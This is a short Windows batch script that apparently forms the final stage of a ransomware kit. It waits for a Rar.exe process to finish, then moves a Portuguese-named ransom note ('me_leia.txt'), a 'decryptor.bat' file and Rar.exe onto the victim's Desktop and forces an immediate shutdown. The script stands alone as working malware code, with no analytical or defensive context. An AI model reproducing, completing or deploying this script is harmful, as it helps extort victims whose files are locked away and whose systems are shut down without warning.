@echo off

:loop
tasklist /fi "imagename eq Rar.exe" | find /i "Rar.exe" > nul
if %errorlevel% == 1 (
    move /y "me_leia.txt" "C:\Users\%USERNAME%\Desktop\"
    move /y "decryptor.bat" "C:\Users\%USERNAME%\Desktop\"
    move /y "Rar.exe" "C:\Users\%USERNAME%\Desktop\"
    timeout /t 3 /nobreak 
    shutdown /s /f /t 0
)
goto loop